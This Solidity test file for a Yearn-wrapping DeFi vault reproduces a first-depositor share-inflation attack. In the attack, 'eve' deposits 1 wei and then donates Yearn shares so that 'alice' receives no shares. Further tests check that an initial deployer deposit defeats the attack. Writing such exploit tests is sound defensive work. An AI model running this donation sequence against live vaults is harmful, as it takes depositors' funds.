// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Test } from "@ecmendenhall/forge-std/src/Test.sol";
import "@ecmendenhall/forge-std/src/console.sol";

import "../../../contracts/core/defi/vault/Vault.sol";
import "../../../contracts/core/defi/vault/VaultFeeController.sol";
import "../../../contracts/core/interfaces/IContractRegistry.sol";
import "../../../contracts/core/interfaces/IACLRegistry.sol";

address constant CRV_ECRV = 0xA3D87FffcE63B53E0d54fAa1cc983B7eB0b74A9c;
address constant YEARN_REGISTRY = 0x50c1a2eA0a861A967D9d0FFE2AE4012c2E053804;
address constant CONTRACT_REGISTRY = 0x85831b53AFb86889c20aF38e654d871D8b0B7eC3;
address constant ACL_REGISTRY = 0x8A41aAa4B467ea545DDDc5759cE3D35984F093f4;
address constant ACL_ADMIN = 0x92a1cB552d0e177f3A135B4c87A4160C8f2a485f;
address constant YEARN_SETH_VAULT = 0x986b4AFF588a109c09B50A03f42E4110E29D353F;

interface IYearnSethVault is IERC20 {
  function deposit(uint256 _amount) external returns (uint256);

  function pricePerShare() external view returns (uint256);
}

/// @dev Block number 15176500
contract VaultTest is Test {
  IERC20 internal asset;
  IYearnSethVault internal yearn;

  VaultFeeController internal feeController;
  Vault internal vault;

  uint256 constant DEPOSIT_FEE = 50 * 1e14;
  uint256 constant WITHDRAWAL_FEE = 50 * 1e14;
  uint256 constant MANAGEMENT_FEE = 200 * 1e14;
  uint256 constant PERFORMANCE_FEE = 2000 * 1e14;

  address constant alice = address(42);
  address constant eve = address(43);
  address constant deployer = address(44);

  function setUp() public {
    asset = IERC20(CRV_ECRV);
    vault = new Vault(
      CRV_ECRV,
      YEARN_REGISTRY,
      IContractRegistry(CONTRACT_REGISTRY),
      address(0),
      Vault.FeeStructure({
        deposit: DEPOSIT_FEE,
        withdrawal: WITHDRAWAL_FEE,
        management: MANAGEMENT_FEE,
        performance: PERFORMANCE_FEE
      }),
      Vault.KeeperConfig({ minWithdrawalAmount: 100, incentiveVigBps: 1, keeperPayout: 9 })
    );

    feeController = new VaultFeeController(
      VaultFeeController.FeeStructure({
        deposit: DEPOSIT_FEE,
        withdrawal: WITHDRAWAL_FEE,
        management: MANAGEMENT_FEE,
        performance: PERFORMANCE_FEE
      }),
      IContractRegistry(CONTRACT_REGISTRY)
    );

    vm.prank(ACL_ADMIN);
    IACLRegistry(ACL_REGISTRY).grantRole(keccak256("ApprovedContract"), address(alice));

    vm.prank(ACL_ADMIN);
    IACLRegistry(ACL_REGISTRY).grantRole(keccak256("ApprovedContract"), address(eve));

    vm.prank(ACL_ADMIN);
    IACLRegistry(ACL_REGISTRY).grantRole(keccak256("ApprovedContract"), address(deployer));

    deal(address(asset), address(alice), 10_000_000 ether);
    deal(address(asset), address(eve), 10_000_000 ether);
    deal(address(asset), address(deployer), 10_000_000 ether);

    vm.prank(alice);
    asset.approve(address(vault), type(uint256).max);

    vm.startPrank(eve);
    asset.approve(address(vault), type(uint256).max);
    asset.approve(YEARN_SETH_VAULT, type(uint256).max);
    vm.stopPrank();

    vm.prank(deployer);
    asset.approve(address(vault), type(uint256).max);

    vm.prank(ACL_ADMIN);
    IContractRegistry(CONTRACT_REGISTRY).addContract(
      keccak256("VaultFeeController"),
      address(feeController),
      keccak256("1")
    );

    yearn = IYearnSethVault(YEARN_SETH_VAULT);

    vm.label(alice, "alice");
    vm.label(eve, "eve");
    vm.label(deployer, "deployer");
  }

  function test_malicious_initial_deposit() public {
    // Eve deposits 1 wei of vault asset.
    vm.prank(eve);
    vault.deposit(1);

    // Eve now has 1 vault share.
    assertEq(vault.balanceOf(address(eve)), 1);

    // Eve deposits 1000 tokens of vault asset
    // directy to the wrapped Yearn vault.
    vm.prank(eve);
    yearn.deposit(1000 ether);
    assertEq(yearn.balanceOf(eve), 516.014512217132854943 ether);

    // Eve "donates" these Yearn shares directly
    // to the vault wrapper.
    vm.prank(eve);
    yearn.transfer(address(vault), 516.014512217132854943 ether);

    // Underlying vault balance is equal to
    // 1000 vault asset tokens.
    assertEq(vault.totalAssets(), 999.999999999999999920 ether);

    // Alice deposits to vault
    vm.prank(alice);
    vault.deposit(1 ether);

    // Alice gets no shares
    assertEq(vault.balanceOf(address(alice)), 0);
  }

  function test_deployer_makes_initial_deposit() public {
    // Deployer makes initial deposit.
    vm.prank(deployer);
    vault.deposit(0.05 ether);

    // Now Eve will attempt the same attack...

    // Eve deposits 1 wei of vault asset.
    vm.prank(eve);
    vault.deposit(1);

    // Eve now has 1 wei of vault shares.
    assertEq(vault.balanceOf(address(eve)), 1);

    // Eve deposits 1000 tokens of vault asset
    // directy to the wrapped Yearn vault.
    vm.prank(eve);
    yearn.deposit(1000 ether);
    assertEq(yearn.balanceOf(eve), 516.014512217132854942 ether);

    // Eve "donates" these Yearn shares directly
    // to the vault wrapper.
    vm.prank(eve);
    yearn.transfer(address(vault), 516.014512217132854942 ether);

    // Underlying vault balance is equal to
    // 1000 + 0.5 vault asset tokens.
    assertEq(vault.totalAssets(), 1000.049999999999999916 ether);

    // Alice deposits to vault
    vm.prank(alice);
    vault.deposit(1 ether);

    // Alice gets vault shares for her deposit
    assertEq(vault.balanceOf(address(alice)), 62183613524155);

    // Alice's vault shares are equal to her
    // deposit amount minus fees
    assertEq(vault.assetsOf(address(alice)), 0.995000000000004151 ether);
  }

  function test_fuzz_initial_deposit_size(
    uint64 initialDeposit /*uint64 initialDeposit*/
  ) public {
    vm.assume(initialDeposit > 0.01 ether);
    vm.assume(initialDeposit < 1 ether);

    // Deployer makes initial deposit.
    vm.prank(deployer);
    vault.deposit(initialDeposit);

    // Now Eve will attempt the same attack...

    // Eve deposits 1 wei of vault asset.
    vm.prank(eve);
    vault.deposit(1);

    // Eve deposits 1000 tokens of vault asset
    // directy to the wrapped Yearn vault.
    vm.prank(eve);
    yearn.deposit(1000 ether);
    console.log("eve yearn balance", yearn.balanceOf(eve));

    // Eve "donates" these Yearn shares directly
    // to the vault wrapper.
    vm.startPrank(eve);
    bool success = yearn.transfer(address(vault), yearn.balanceOf(eve));
    vm.stopPrank();

    // Alice deposits to vault
    vm.prank(alice);
    vault.deposit(1 ether);

    // Alice gets vault shares for her deposit
    console.log("initial deposit: ", initialDeposit);
    console.log("alice shares: ", vault.balanceOf(address(alice)));

    assertGt(vault.balanceOf(address(alice)), 0);
  }
}
